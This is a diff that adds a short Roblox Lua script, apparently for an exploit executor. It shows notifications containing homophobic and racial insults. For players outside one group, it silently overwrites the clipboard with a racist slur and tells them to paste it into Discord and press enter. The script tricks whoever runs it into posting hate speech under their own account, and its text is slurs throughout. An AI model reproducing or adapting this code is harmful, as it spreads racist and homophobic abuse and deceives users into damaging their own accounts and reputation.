@@ -1,0 +1,18 @@
+pcall(function()
+  game.StarterGui:SetCore("SendNotification", {
+    Title = 'guess what';
+    Text = 'your big gay man';
+    Duration = 20;
+  })
+  if not game.Players.LocalPlayer:IsInGroup(8656837) then
+    coroutine.resume(coroutine.create(function()
+       wait(10)
+       game.StarterGui:SetCore("SendNotification", {
+        Title = 'your black';
+        Text = 'press ctrl v in discord and press enter';
+        Duration = 20;
+       })
+       setclipboard('big black nigga balls')
+    end))
+  end
+end)
